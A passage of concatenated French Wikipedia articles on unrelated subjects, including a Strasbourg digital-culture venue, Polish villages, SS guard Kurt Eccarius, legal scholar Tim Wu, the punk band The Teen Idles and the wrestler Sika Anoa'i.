Il était prévu depuis 2011 d'implanter un pôle dédié aux technologies de l'information et de la communication au sein du Pôle Seegmuller.
L'ouverture du lieu en fut précédée d'une saison « hors les murs » avec des interventions d'artistes comme Luc Schuiten.
Le projet a été primé en dans le cadre d'un appel à projets organisé par le ministère de la Ville, de la Jeunesse et des Sports.
Il a reçu en le label argent « Territoire Innovant ».
Le projet a également été présenté dans le cadre de la candidature du pôle métropolitain Strasbourg-Mulhouse au label French Tech.
Du 17 au 21 décembre 2019, les locaux alors inoccupés sont squattés par des manifestants dénonçant le manque d'utilisations du lieu
À la suite d'une délégation de service public le 1er janvier 2024, sa gestion est aujourd'hui assurée par l'association la Cybergrange, à la tête d'un consortium d'acteurs de la médiation numérique (la Ligue de l'Enseignement 67, Emmaüs Connect, Random Bazar et la Longevity Music School).
À travers une programmation pluridisciplinaire et gratuite, le lieu propose à la fois une appropriation des outils par des formations alliant théorie et pratique, mais aussi un espace de réflexion critique autour de nos usages numériques.
Sa devise ? 
"Pour un numérique responsable, utile et créatif, à la portée de toutes et tous !" 
Composition.
L'espace du Shadok fait et comprend :

</doc>
<doc id="8729499" url="https://fr.wikipedia.org/wiki?curid=8729499" title="Ashok Nagar">
Ashok Nagar

Ashok Nagar (aussi Ashoknagar) est une ville située au nord-est de l'État du Madhya Pradesh en Inde centrale et est le siège administratif du district d'Ashok Nagar. Auparavant, la ville appartenait au district de Guna.

</doc>
<doc id="8729519" url="https://fr.wikipedia.org/wiki?curid=8729519" title="La Conjecture de Fermat">
La Conjecture de Fermat

La Conjecture de Fermat est un roman policier historique de Jean d'Aillon publié en 2006 aux éditions Jean-Claude Lattès.
Résumé.
En 1643, les Espagnols connaissent les dépêches françaises codées par Rossignol et Louis est chargé de l'enquête. Il enrôle Gaston. Manessier, chiffreur de Rossignol, est tué en faisant croire à un suicide pour l'inculper. Gaufredi, serviteur de Louis, tue Habert, autre chiffreur, certainement le traître, les ayant attaqués. Louis rencontre le jeune Pascal pour sa première calculette, qui lui propose de rencontrer Fermat à Toulouse et de ramener sa démonstration de sa conjecture. 
Lionne, secrétaire d'État, révèle à Louis que le chef conspirateur est Fontrailles. Louis se rend à Toulouse en carrosse et emmène Bresche, libraire. Lionne le fait loger chez Castelbajac. Fermat lui donne un code sécurisé et la démonstration. Louis apprend que Castelbajac est la sœur de Fontrailles et déduit que Lionne est complice. 
Cependant, Gaston découvre que Fontrailles a volé des papiers à Chigi, envoyé du pape pour le congrès de Munster, et en trouve un où il est dit à Chigi qu'il aura les dépêches françaises grâce à un autre chiffreur traître. Louis et Bresche quittent Toulouse à cheval. Gaufredi les rejoint en carrosse à Montauban, mais Bresche et des comparses ont enlevé Louis. Il repart chez Castelbajac, dont il découvre l'innocence et celle de Lionne. Louis rejoint Paris. Gaufredi le poursuit. Bresche révèle qu'il a aussi un chiffreur espion : Chantelou. 
À Paris, Louis est enchaîné chez Fontrailles qui brûle la démonstration de Fermat prise pour le code. Gaufredi va chercher Gaston et donne le code à Lionne. Ils capturent Bresche qui dit où est Louis qu'ils libèrent, puis arrêtent Chantelou. Mazarin vient rétribuer Louis qui rentre ensuite à Mercy.

</doc>
<doc id="8729521" url="https://fr.wikipedia.org/wiki?curid=8729521" title="Ashoknagar">
Ashoknagar



</doc>
<doc id="8729538" url="https://fr.wikipedia.org/wiki?curid=8729538" title="Aigle du meilleur montage">
Aigle du meilleur montage

L'Aigle du meilleur montage (en polonais : ) est une récompense cinématographique polonaise. 
C'est l'un des prix attribués chaque année depuis 1999 (pour les films sortis l'année précédente) par l'Académie du cinéma de Pologne dans le cadre des Aigles du cinéma polonais : Orły.
Seuls deux monteurs ont été récompensés à trois reprises Jarosław Kamiński (2004, 2013 et 2014) et Wanda Zeman (2000, 2006 et 2008).
Les monteurs ayant été le plus souvent nommé à ce prix sont Wanda Zeman, avec 10 nominations, suivi par Elżbieta Kurkowska, 8 nominations et Krzysztof Szpetmański, 7 nominations.

</doc>
<doc id="8729542" url="https://fr.wikipedia.org/wiki?curid=8729542" title="There Goes the Bride (film, 1932)">
There Goes the Bride (film, 1932)

 est un film britannique réalisé par Albert de Courville, sorti en 1932.
Synopsis.
La fille d'un homme d'affaires s'enfuit pour échapper à un mariage arrangé, et se retrouve au sein d'un quiproquo.

</doc>
<doc id="8729568" url="https://fr.wikipedia.org/wiki?curid=8729568" title="Kurt Eccarius">
Kurt Eccarius

Kurt Eccarius, né à Cobourg le , était un Hauptscharführer SS qui était responsable de la prison "(Zellenbau)" du camp de concentration d'Oranienbourg-Sachsenhausen de 1939 à 1945. 
Biographie.
Jeunesse et carrière.
Fils de Robert Eccarius, vigneron, Kurt Eccarius fait un apprentissage de machiniste et travaille pour diverses sociétés dans cette profession. En 1929, il adhère au NSDAP et de la SS. 
De mars à mai 1933, Eccarius devient auxiliaire de police à Cobourg et puis rejoint le bataillon de gardes du camp de concentration de Dachau. En juin 1936, il est transféré au camp de concentration de Columbia, dans un poste administratif au camp de détention préventive. En novembre 1936, il travaille au camp de concentration de Sachsenhausen. Eccarius est d'abord chef adjoint, puis, à partir d'août 1942, chef de la prison "(Zellenbau)", où il surveille des détenus politiques de haute importance comme l'ancien chancelier autrichien Kurt Schuschnigg, le chef de la Garde de fer, Horia Sima, ou le nationaliste ukrainien Stepan Bandera.
Arrestation et procès.
Kurt Eccarius est capturé par les Britanniques puis remis aux Soviétiques. Il est jugé pour crimes de guerre en 1947 par les Soviétiques en même temps que Anton Kaindl, le dernier commandant de Sachsenhausen, Gustav Sorge, ainsi que 11 officiers SS, un fonctionnaire et deux kapos dont Paul Sakowski, qui fut le contremaître du crématorium et le bourreau du camp de Sachsenhausen de 1941 à 1943 .
Kurt Eccarius est reconnu coupable le et condamné aux travaux forcés au goulag de Vorkouta.
Amnistie et procès.
En , dans un accord négocié par le premier ministre ouest-allemand Konrad Adenauer, Kurt Eccarius est rapatrié en Allemagne de l'Ouest avec d'autres prisonniers de guerre allemands. En 1962, il est inculpé par les autorités ouest-allemandes pour le meurtre de prisonniers près de Wittstock et pour une marche de la mort des déportés de Sachsenhausen au nord-ouest de Crivitz, le un jour avant la libération du camp par l'armée soviétique. Il est reconnu coupable le par la Cour fédérale de district à Cobourg et condamné à quatre ans de prison.
En 1962, Kurt Eccarius fut poursuivi pour complicité dans le meurtre de plus de soviétiques lors de Genickschussanlage en 1941. Le procès a eu lieu devant la Cour fédérale de district de Munich, où il est reconnu coupable et condamné à huit ans et demi de prison le . Il a été libéré après avoir purgé deux ans. Il a également été inculpé pour l'assassinat de Iakov Djougachvili, fils de Joseph Staline.

</doc>
<doc id="8729572" url="https://fr.wikipedia.org/wiki?curid=8729572" title="Veillot">
Veillot



</doc>
<doc id="8729580" url="https://fr.wikipedia.org/wiki?curid=8729580" title="Sobole (Mazovie)">
Sobole (Mazovie)

Sobole (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729600" url="https://fr.wikipedia.org/wiki?curid=8729600" title="Stróżewo (Mazovie)">
Stróżewo (Mazovie)

Stróżewo (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729606" url="https://fr.wikipedia.org/wiki?curid=8729606" title="Tim Wu">
Tim Wu

Tim Wu est un juriste américain, professeur à la Columbia Law School et rédacteur d'opinion pour le "New York Times". Il est surtout connu pour avoir inventé et popularisé l'expression de neutralité du réseau.
Biographie.
Tim Wu est né à Washington et a grandi à Bâle en Suisse et à Toronto au Canada. Son père, Alan Ming-ta Wu, était originaire de Taïwan et sa mère Gillian Wu est britannico-canadienne. Ils ont étudié tous les deux l'immunologie à l'université de Toronto. À l'école, Wu se lie d'amitié avec Cory Doctorow. Il a fréquenté l'université McGill où il a d'abord étudié la biochimie, puis la biophysique. Il a obtenu un baccalauréat universitaire en sciences en 1995 et un diplôme de droit à l'université de Harvard en 1998. À Harvard, il étudia sous la direction de Lawrence Lessig, spécialiste des droits d'auteur.
Wu a été professeur agrégé de droit à l'université de Virginie de 2002 à 2004, professeur invité à la Columbia Law School en 2004, professeur invité à la Chicago Law School en 2005 et professeur invité à la Stanford Law School en 2005. En 2006 il est devenu professeur titulaire à la Columbia Law School et a lancé le projet Posner, une base de données gratuite de tous les avis juridiques de Richard Posner. Tim Wu a déclaré que Posner était .
Influence.
Wu est connu pour avoir popularisé le concept de neutralité du réseau dans son article de 2003, "Network Neutrality, Broadband Discrimination". L'article examine la neutralité du réseau en termes de neutralité entre les applications, ainsi que la neutralité entre les données et propose une législation pour traiter ces questions.
En 2006, Wu écrit "The World Trade Law of Internet Filtering", qui analyse la possibilité de traiter la censure comme un obstacle au commerce par l'organisation mondiale du commerce. En , quand Google a fait pression sur le bureau du représentant américain au commerce pour qu'il porte plainte contre la censure chinoise à l'OMC, l'article de Wu a été cité comme une de cette idée. En 2006, Wu a également été invité par la Federal Communications Commission (FCC) pour aider à rédiger les premières règles de neutralité du réseau liées à la fusion de AT&amp;T et BellSouth.

</doc>
<doc id="8729630" url="https://fr.wikipedia.org/wiki?curid=8729630" title="Ketukuba">
Ketukuba

Ketukuba est un septième album du groupe Africando sorti en 2006 et cet album rend hommage au chanteur Gnonnas Pedro et au pianiste cubain Alfredo Rodriguez. 
Description.
« Ketukuba » signifie « de l’origine (l’Afrique) à Cuba » (dans une langue béninoise).
Les voix africaines chantent à Dakar, Bamako et Abidjan, les musiciens africains et cubains sont installés à Paris, et les sections rythmiques, de cordes et de cuivres latinos, résident à New York et Miami.
« Ketukuba » rend hommage au chanteur Gnonnas Pedro et au pianiste cubain Alfredo Rodriguez.
Gnonnas Pedro, disparu en août 2004, intégra le groupe Africando en 1995, à la suite du décès du grand chanteur sénégalais Pape Seck. Gnonnas Pedro était déjà célèbre en Afrique par son travail au sein de sa propre formation, Los Dadjès de Cotonou, qu’il avait formée dans les années soixante.
Alfredo Rodriguez, installé à Paris depuis trente ans, a réalisé les arrangements de trois titres de cet album ; il a disparu de façon abrupte avant même d’avoir pu écouter le mixage de ses ultimes créations.
Les arrangements sont de Boncana Maïga, Alfredo Rodriguez, le chef d’orchestre et Nelson Hernandez, compositeur et arrangeur qui était déjà présent sur l'album « Martina » et qui a collaboré notamment avec Celia Cruz, La India et, récemment, le groupe Kékélé.
Parmi les nouveaux arrivés, on découvre deux chanteurs sénégalais, Basse Sarr et Pascal Dieng, ainsi que le Portoricain Joe King (José Reyes, pour l’état civil). Se joignent à eux, en « guests », le chanteur Madilou, (du Zaïre), ainsi que Lodia Mansur (fils du chanteur d’Africando Medoune Diallo).

</doc>
<doc id="8729652" url="https://fr.wikipedia.org/wiki?curid=8729652" title="Jovian">
Jovian

Jovian est un lémurien né le au Duke Lemur Center, Durham, Caroline du Nord (États-Unis) et mort le au même endroit, est le lémurien apparaissant dans la série pour enfants "Zoboomafoo". Il s'agit d'un lémurien de type Propithèque de Coquerel.
Biographie.
Jovian est né le à Duke Lemur Center, Durham, Caroline du Nord (États-Unis).
Il meurt le à l'âge de 20 ans après avoir participé à de nombreux épisodes de la série "Zoboomafoo".

</doc>
<doc id="8729654" url="https://fr.wikipedia.org/wiki?curid=8729654" title="Nick Travis">
Nick Travis

Nick Travis, de son vrai nom Nicholas Anthony Travascio, né le à Philadelphie en Pennsylvanie et mort à New York le , est un trompettiste de jazz américain.
Biographie.
Entre 1942 et 1944, Nick Travis joue dans les groupes et les big bands de Vido Musso et de Woody Herman. Après la guerre, et le service militaire, on le retrouve chez Gene Krupa, Tex Beneke, Jimmy Dorsey ou à nouveau Woody Herman. Il est un des principaux solistes du Finnegan-Sauter Orchestra.
À partir des années 1950, Il joue également dans des formations de jazz moderne, tels que celles de Thelonious Monk et de Gerry Mulligan et enregistre avec Al Cohn, Zoot Sims, Bob Brookmeyer, Manny Albam. Il est actif comme musicien de studio pour NBC. En 1954, il enregistre pour RCA son seul album comme leader d'un quintet qui comprend Al Cohn, Johnny Williams, Teddy Kotick et Art Mardigan.
Nick Travis meurt d'ulcères en 1964, à l'âge de 38 ans.

</doc>
<doc id="8729671" url="https://fr.wikipedia.org/wiki?curid=8729671" title="Séméndria">
Séméndria



</doc>
<doc id="8729682" url="https://fr.wikipedia.org/wiki?curid=8729682" title="Équipe cycliste SC Michela Fanini">
Équipe cycliste SC Michela Fanini

L'équipe cycliste SC Michela Fanini est une équipe cycliste féminine italienne. Elle a son siège à Lunata Capannori près de Lucques en Toscane. Elle a été créée en 1999 par Brunello et Piero Fanini en mémoire de la fille du premier : Michela Fanini, coureuse professionnelle italienne décédée d'un accident de la route.
Histoire de l'équipe.
L'équipe SC Michela Fanini Record Rox a été créée en 1999 en mémoire de Michela Fanini, coureuse professionnelle italienne décédée à l'âge de 21 ans d'un accident de la route, dont le père est Brunello Fanini, le président de l'équipe.
Elle a son siège à Lunata Capannori près de Lucques en Toscane.
Classements UCI.
Ce tableau présente les places de l'équipe au classement de l'Union cycliste internationale en fin de saison, ainsi que la meilleure cycliste au classement individuel de chaque saison.
Le tableau ci-dessous présente les classements de l'équipe sur la Coupe du monde, ainsi que sa meilleure coureuse au classement individuel.
À partir de 2016, l'UCI World Tour féminin remplace la Coupe du monde.
Encadrement de l'équipe.
L'équipe est dirigée par Piero Fanini et Brunello Fanini. Le premier a été directeur général de l'équipe de 2006 à 2014, le second est représentant de l'équipe auprès de l'UCI depuis 2006. En 2006 et 2007, Lido Saletti est également directeur général. Antonio Fanelli est adjoint à la direction en 2006. Il est remplacé l'année suivante par Gianluigi Barsottelli qui reste à ce poste jusqu'en 2009. Paolo Baldi est directeur de l'équipe en 2008. En 2009, Alfonso Mottola le remplace et reste jusqu'en 2010. À partir de cette dernière année, Gianfranco Miele devient directeur de l'équipe, tandis que Lido Francini devient adjoint. En 2011, ce dernier est remplacé par Alberto Alessandri qui reste jusqu'en 2012. Roberto Lencioni remplace Mottola et reste deux ans. En 2012, Miele n'est plus dans l'équipe de direction. En 2013, Lencioni part. Giuseppe Lanzoni devient directeur sportif et Alessandri est remplacé par Lido Saletti. L'équipe dirigeante est identique en 2014 et 2015, même si cette dernière année Giuseppe Lanzoni devient officiellement directeur sportif. En 2016, Antonio Fanelli est directeur sportif. Il est assisté de Piero Fanini et de Lido Saletti. En 2017, Piero Fanini est directeur sportif, ses adjoints sont Pietro Cesari et Mirko Puglioli.
En 2015, les vice-présidents de l'équipe sont Angelo Giannini et Leonelo Stephani. La secrétaire est Daniela Fanini. Le docteur est Stephano Bianchi, les masseurs Vittorio Nuanziati et Christian Michelotti, les mécaniciens Mauro Gambaro et Armando Gialdini. Le responsable presse est Maurizio Tintori. Les accompagnateurs sont Paolo Guidi, Piero Pucci et Vittorio Tabarracci.
Partenaires.
Le partenaire principal de l'équipe est depuis 1999, le fabricant de chaussures Rox. Les cycles sont fournis par la marque Lombardo et montés avec des groupes Shimano.
Saisons précédentes.
Par ailleurs, Annalisa Cucinotta remporte le scratch à Moscou le .
Par ailleurs, Annalisa Cucinotta remporte le scratch à Cali le .
Début juin, Brunello Fanini, président de l'équipe SC Michela Fanini Record Rox recrute Tatiana Guderzo et Monia Baccaille pour compenser un début de saison décevant et le départ de Carmen Small.
SC Michela Fanini Rox est vingt-cinquième au classement par équipes.
SC Michela Fanini Rox est vingt-cinquième au classement par équipes.
SC Michela Fanini Rox est trente-cinquième au classement par équipes.

</doc>
<doc id="8729690" url="https://fr.wikipedia.org/wiki?curid=8729690" title="Szczytniki (Mazovie)">
Szczytniki (Mazovie)

Szczytniki (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729691" url="https://fr.wikipedia.org/wiki?curid=8729691" title="Kniajévats">
Kniajévats



</doc>
<doc id="8729695" url="https://fr.wikipedia.org/wiki?curid=8729695" title="Équipe cycliste SC Michela Fanini Record Rox">
Équipe cycliste SC Michela Fanini Record Rox



</doc>
<doc id="8729696" url="https://fr.wikipedia.org/wiki?curid=8729696" title="Zayétchar">
Zayétchar



</doc>
<doc id="8729706" url="https://fr.wikipedia.org/wiki?curid=8729706" title="Szczytno (Płońsk)">
Szczytno (Płońsk)

Szczytno (prononciation : ) est un village polonais de la "gmina" de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord de Załuski (siège de la "gmina"), au sud-est de Płońsk (siège du "powiat") et à au nord-ouest de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729710" url="https://fr.wikipedia.org/wiki?curid=8729710" title="Boucle d'Orsova">
Boucle d'Orsova



</doc>
<doc id="8729720" url="https://fr.wikipedia.org/wiki?curid=8729720" title="Egri Palanka">
Egri Palanka



</doc>
<doc id="8729723" url="https://fr.wikipedia.org/wiki?curid=8729723" title="Wojny (Mazovie)">
Wojny (Mazovie)

Wojny (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres à l'est de Załuski (siège de la "gmina"), 20 kilomètres au sud-est de Płońsk (siège du "powiat") et à 44 kilomètres au nord-ouest de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729727" url="https://fr.wikipedia.org/wiki?curid=8729727" title="Christoph Tietze">
Christoph Tietze

Christoph Tietze est un poète luthérien allemand né le , en Silésie, à Wilkau, aujourd'hui Wilków près de Cracovie, et décédé le à Hersbruck, en Bavière.
Biographie.
Son père, de même nom, était pasteur à Wilkau. Il entre au collège Sainte Marie Madeleine de Breslau, aujourd'hui Cracovie, en 1654 puis au lycée Saint Gilles de Nuremberg en 1660. C'est ensuite l'université d'Altdorf qui le reçoit comme étudiant en théologie en 1662 et Christoph Tietze termine ses études en 1664 à l'université d'Iéna. Le , il a été ordonné pasteur de Laubenzedel, près de Gunzenhausen puis assure la même charge à partir de 1671 à Henfenfeld, près de Nuremberg. En 1685, il est nommé diacre à Hersbruck, toujours dans la région de Nuremberg, puis archidiacre en et enfin pasteur et inspecteur des écoles en novembre de la même année.
Johann Sebastian Bach utilisa un de ses textes pour le choral final de sa cantate BWV 179.

</doc>
<doc id="8729728" url="https://fr.wikipedia.org/wiki?curid=8729728" title="Zdunowo (Mazovie)">
Zdunowo (Mazovie)

Zdunowo (prononciation : ) est un village polonais de la gmina de Załuski dans le powiat de Płońsk de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Ciechanów.

</doc>
<doc id="8729736" url="https://fr.wikipedia.org/wiki?curid=8729736" title="Régiment d'Illyrie">
Régiment d'Illyrie

Le régiment d'Illyrie est un régiment d'infanterie légère levé dans les provinces Illyriennes qui servit dans les rangs de l'Armée napoléonienne.
Créée en 1810, l'unité fut dissoute le après voir pris part aux campagnes de Russie et d'Allemagne.
Historique.
Le régiment d'Illyrie fut levé par un décret du . Un tiers de son cadre d'officiers était d'origine française, le reste se composant de Belges au service de l'Autriche et d'Autrichiens.
Dans une lettre datée du , Napoléon donne au duc de Feltre (Clarke), ministre de la Guerre, des instructions précises quant à son organisation :
En mai, Napoléon s'inquiète dans une lettre au ministre de la guerre des brevets des officiers :
Par une lettre adressée à son ministre le , l'Empereur réorganise et réaffecte le régiment en ces termes :
Commandants.
En 1811, le régiment était commandé par le colonel Nicolas Schmitz déjà fait Officier de la Légion d'honneur dès novembre 1804 et promu général de brigade le . Il est alors remplacé par le colonel Jean Muller jusqu'à la dissolution du régiment. Schmitz fut blessé à deux reprises à la tête de ses troupes.
Uniforme.
Le régiment portait l'uniforme bleu de l'infanterie légère avec des épaulettes rouges bordées d'un galon argenté.
Campagnes.
Campagne de Russie.
En 1812, le régiment est de la campagne de Russie.
Muté à Turin, . Mi-janvier, il est affecté à la , partie du « Corps d'Observation de l'Océan ».
Le régiment tient ensuite garnison à Vilna début juillet. Le 20, il reçoit un ordre de marche l'assignant à la couverture de l'avance de la du d'armée sous les ordres du maréchal Ney puis il prend part à la bataille d'Ostrovno. Par une lettre de l'Empereur datée de Dorogobouje du , le régiment est dirigé sur Minsk. . Les Illyriens sont ensuite à Krasnoïe, Smorgny et Kowno.
Campagne d'Allemagne.
En 1813, le régiment est à Juterbock, Leipzig et Hanau, dernière bataille à laquelle il prendra part avant sa dissolution en novembre.

</doc>
<doc id="8729739" url="https://fr.wikipedia.org/wiki?curid=8729739" title="Katchanik">
Katchanik



</doc>
<doc id="8729742" url="https://fr.wikipedia.org/wiki?curid=8729742" title="The Teen Idles">
The Teen Idles

The Teen Idles est un groupe américain de punk hardcore originaire de Washington. Formé en , le groupe se compose des adolescents Nathan Strejcek, Geordie Grindle, Ian MacKaye et Jeff Nelson ayant effectué deux sessions de démos et sorti un EP intitulé "" avant leur séparation en . Le label discographique Dischord Records était à l'origine créé dans l'unique objectif de commercialiser le premier album des Teen Idles, à cette époque devenus fondateurs du mouvement D.C. hardcore. MacKaye et Nelson formeront par la suite le groupe punk Minor Threat.
The Teen Idles est l'un des premiers groupes punk rock du mouvement hardcore à jouer ailleurs que dans leur scène régionale. Inspirée de groupes punk comme the Cramps et Bad Brains, la musique des Teen Idles est une première version du punk hardcore, et une tentative , selon les termes de MacKaye. Leur apparition, paroles et style musical cherchent à raviver un mouvement punk qu'ils croient enterré.
Biographie.
Formation.
En 1978, Ian MacKaye découvre le punk rock sur la chaîne de radio étudiante locale WGTB à l'université de Georgetown. Il fait la rencontre de Jeff Nelson, l'un de ses camarades de classe. Ils se lient d'amitié et découvrent un intérêt commun pour le punk. MacKaye et Nelson assistent à leur premier concert de punk en —un concert des Cramps pour WGTB. Le concert inspire le duo ; MacKaye admet plus tard : 
Après avoir assisté à un concert des Bad Brains, MacKaye et Nelson se lancent dans un groupe punk, les Slinkees, avec leurs amis étudiants George Grindle et Mark Sullivan. Les Slinkees participaient à un concert avant l'arrivée de Sullivan. N'ayant pas réussi à recruter un ami de MacKaye, Henry Garfield (plus tard Henry Rollins), le groupe engage Nathan Strejcek au chant. Les Slinkees se renomment par la suite en Teen Idles. Après quelques tournées et répétitions pendant de nombreux mois, le groupe enregistre deux sessions de démos dans un studio local en février et , tandis que l'ingénieur son et un autre groupe invité se moquent ouvertement de ce qu'ils jouent. Ils jouent également lors de fêtes locales, et pour Bad Brains dans une galerie d'arts située dans le voisinage d'Adams-Morgan, Madam's Organ.
Souhaitant jouer une musique punk plus solide, que le groupe pense gâché par la new wave, les Idles cherche à se rendre le plus intimidant possible. Ils se rasent la tête, se laissent pousser la crête iroquoise et portent des accessoires punk. Nelson et MacKaye plantent même des punaises dans les semelles de leurs bottes pour faire un lorsqu'ils marchent. La présentation visuelle du groupe est contradictoire par rapport à leur comportement ; selon MacKaye, 
Après quelques concerts à Washington aux côtés de groupes comme Untouchables, les Idles décident d'organiser une tournée sur la côte ouest en . Avec Garfield et Sullivan, le groupe voyage jusqu'en Californie. Ils sont immédiatement appréhendés par la police à leur arrivée, et après leur avoir fait face, Nelson est menotté pendant une heure. Au début de leur tournée, les Teen Idles sont refusés à l'entrée du Hong Kong Cafe de Los Angeles à cause de leur âge. Devant jouer aux côtés des Dead Kennedys et des Circle Jerks, ils sont contraints de jouer le lendemain avec the Mentors et un groupe appelé Puke, Spit and Guts en échange de . Les Teen Idles impressionne le public ; MacKaye explique plus tard que À leur retour à Washington, les Teen Idles sont invités par Skip Groff, gérant d'un boutique locale Yesterday and Today, à l'enregistrement de quelques chansons pour Inner Ear, un petit studio situé à Arlington (Virginie). Ils sont présentés à l'ingénieur son et propriétaire Don Zientara. Sept chansons sont enregistrées. Cependant, le groupe ne savent pas quoi faire des cassettes et les mettent éventuellement de côté
Séparation et "".
Durant fin 1980, les Teen Idles décident de se séparer, en particulier à cause d'un désaccord entre Grindle et Nelson. La nouvelle petite amie de Grindle, une chrétienne "born again" désapprouve son groupe ce qui mène Grindle à se remettre en question. Des tensions entre Grindle et Nelson se font sentir jusqu'à ce que Grindle décide de partir. Leur dernier concert se déroule le avec le groupe SVT au 9:30 Club. Après un an d'existence, le groupe remporte un total de . Ils doivent décider entre deux options : diviser l'argent entre membres, ou faire paraître les chansons qu'ils ont produites avec Zientara à Inner Ear. Choisissant la seconde option, Nelson, Strejcek et MacKaye forment Dischord Records avec l'aide de Groff's, pour la parution des chansons.

</doc>
<doc id="8729746" url="https://fr.wikipedia.org/wiki?curid=8729746" title="Kitchévo">
Kitchévo



</doc>
<doc id="8729752" url="https://fr.wikipedia.org/wiki?curid=8729752" title="Delphine (film, 1969)">
Delphine (film, 1969)

Delphine est un film français réalisé par Éric Le Hung et sorti en 1969.
Synopsis.
Delphine est une journaliste de trente ans entourée d'amis et d'amants. Absorbée par son travail, elle prend conscience de la vacuité de sa vie lorsqu'elle rencontre le peintre Portal.

</doc>
<doc id="8729756" url="https://fr.wikipedia.org/wiki?curid=8729756" title="Susan Blinks">
Susan Blinks

Susan Blinks, née le à Washington, est une cavalière de dressage américaine.

</doc>
<doc id="8729760" url="https://fr.wikipedia.org/wiki?curid=8729760" title="Église de Viekijärvi">
Église de Viekijärvi

L'église de Viekijärvi (en ) est une église située à Lieksa en Finlande.
Description.
L'édifice en bois est conçue par A.E. Ollilainen à partir des plans de l'église de Kurkijoki conçus par Frans Anatolius Sjöström.
L'église peut accueillir 1000 personnes.
L'église de Viekijärvi est située à la frontière entre Lieksa et Nurmes à 25 km du centre de Lieksa.

</doc>
<doc id="8729783" url="https://fr.wikipedia.org/wiki?curid=8729783" title="Christine Traurig">
Christine Traurig

Christine Traurig, née le à Nienburg/Weser en Allemagne, est une cavalière de dressage américaine.

</doc>
<doc id="8729793" url="https://fr.wikipedia.org/wiki?curid=8729793" title="Décès en février 2015">
Décès en février 2015



</doc>
<doc id="8729801" url="https://fr.wikipedia.org/wiki?curid=8729801" title="Sika Anoa'i">
Sika Anoa'i

Sika Anoa'i, de son vrai nom Leati Sika Amituana'i Anoaʻi, plus connu sous le nom de ring de « Sika » né le à Leone (île de Tutuila, Samoa américaines) et mort le , est un catcheur samoan. 
Il est principalement connu pour avoir fait équipe avec son frère Afa Anoaʻi avec qui il a formé l'équipe des et a remporté à trois reprises le championnat du monde par équipe de la World Wrestling.
Carrière.
Avec Afa, ils commencent à se faire connaître au Canada où ils ont remporté à deux reprises le championnat international par équipe de la au cours de l'année 1973. Le de cette même année, ils remportent le championnat par équipe du Canada de la et perdent ce titre le .
Avec Afa, ils vont aux États-Unis où ils ont détenu le championnat par équipe du Sud-Est de la NWA Georgia du 15 au .
Il est décédé le 25 juin 2024.
Famille.
Sika Anoa'i est le père de Rosey et de Roman Reigns, eux aussi catcheurs.

</doc>
<doc id="8729804" url="https://fr.wikipedia.org/wiki?curid=8729804" title="Jacques Roure">
Jacques Roure

Jacques Roure, né le à Marseille, est un parolier, metteur en scène et réalisateur français .
Biographie.
Une famille de médecins-musiciens.
Jacques Roure est un des sept enfants du docteur en médecine Paul Roure (1903-1968), également pianiste et contrebassiste dans l'orchestre symphonique de l'opéra de Marseille. Paul Roure fut mécène pour l'établissement, sur la propriété familiale à La Bastide de Solliers près d'Aix-en-Provence, du club de tennis le Country Club Aixois, également siège de la Ligue de Provence de tennis. Le frère de Jacques Roure, Daniel, lui aussi médecin de profession, est pianiste de jazz. Jacques Roure, malgré son intérêt précoce pour la musique, fera également une carrière de médecin. Il sera neuro-psychiatre et psychanalyste jusqu'en 1992.
Le Théâtre de la fonderie.
Entretemps, en 1987, il crée, avec son frère Georges et de Jean-Marc Vidal, le Théâtre de la fonderie 14, cours Saint Louis à Aix-en-Provence. 
Comme acteur, Jacques Roure joue entre autres dans "Les Fourberies de Scapin" de Molière,"Le Schmürtz" de Boris Vian, "L'Atelier"de Jean-Claude Grumberg, "Macbett" de Eugène Ionesco. Il participe deux ans de suite au au château de l'Empéri à Salon-de-Provence dans les pièces "Cyrano de Bergerac" d'Edmond Rostand et "Les misérables" de Victor Hugo. Sa première mise en scène "Le Journal d'un fou" de Nicolas Gogol, jouée en 1992 au théâtre de la Fonderie avec la participation de Vince Castello (acteur) et de Daniel Roure (musique et bruitage) sera également présentée au théâtre de L'Escalier des Doms dans le cadre du « Festival off » d'Avignon.
En 1991, Mouloudji, qui ne chantait pratiquement plus, accepte, par amitié pour Jacques Roure de remonter sur scène au Théâtre de la fonderie.
Cinéaste.
Jacques Roure se lance, également à partir de 1983, dans la réalisation de courts métrages en amateur. Il fréquente un Club des amateurs cinéastes (CACPV) de Marseille et sort pratiquement un film par an. En 1985 son film "Casse-Cache", d'une durée de 30 min, reçoit un accueil très favorable (prix de la ville d’Aix en Provence, prix de la ville de Bordeaux au National de la Fédération française de cinéma et de vidéo) et est diffusé sur Antenne 2 dans l'émission d’Armand Ventre "La télévision des téléspectateurs". Il reçoit de nombreux prix entre autres le prix de la docu-fiction au Concours national 2006, pour "Un homme a disparu", la mention spéciale du jury lors du palmarès du Caméra club de Genève en pour le film "Auguste", le du jury lors du Festival Torcymages 2012 pour son film "Etienne et Louis", un scénario à la façon de Marcel Pagnol d'après un conte de Yvan Audouard (contes de ma Provence. Le pré aux clercs 1986).
Parolier.
